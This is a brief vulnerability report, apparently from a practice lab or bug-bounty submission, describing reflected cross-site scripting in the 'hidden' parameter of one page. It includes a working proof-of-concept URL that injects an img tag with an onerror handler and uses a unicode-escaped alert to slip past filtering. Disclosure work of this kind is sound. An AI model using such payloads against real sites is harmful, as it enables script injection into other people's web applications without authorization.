## Title
Reflected Cross-Site Scripting (XSS) in "hidden" parameter

## Summary
I found a Reflected Cross-Site Scripting vulnerability in the parameter "hidden" in following url

## Affected URL
https://kzlabs.com/punishment/20.php


## Steps to Reproduce
1. Open the following URL in a browser: https://kzlabs.com/punishment/20.php?hidden="><ImG src=x onerror=\u0061lert("XSS")>
...
<img width="3000" height="1292" alt="image" src="https://github.com/user-attachments/assets/ef4ae610-54b2-4bbe-bb34-4ad3eb7a04f8" />
